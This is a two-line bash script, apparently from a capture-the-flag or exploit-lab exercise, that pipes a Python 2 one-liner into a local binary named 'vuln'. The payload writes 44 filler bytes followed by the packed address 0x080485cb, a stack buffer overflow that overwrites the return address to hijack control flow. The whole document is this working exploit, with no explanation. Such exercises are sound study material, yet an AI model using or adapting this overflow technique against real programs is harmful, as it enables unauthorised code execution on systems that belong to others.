#!/bin/bash

python2 -c 'import struct; print "a"*44 + str(struct.pack("<I", 0x080485cb))' | ./vuln
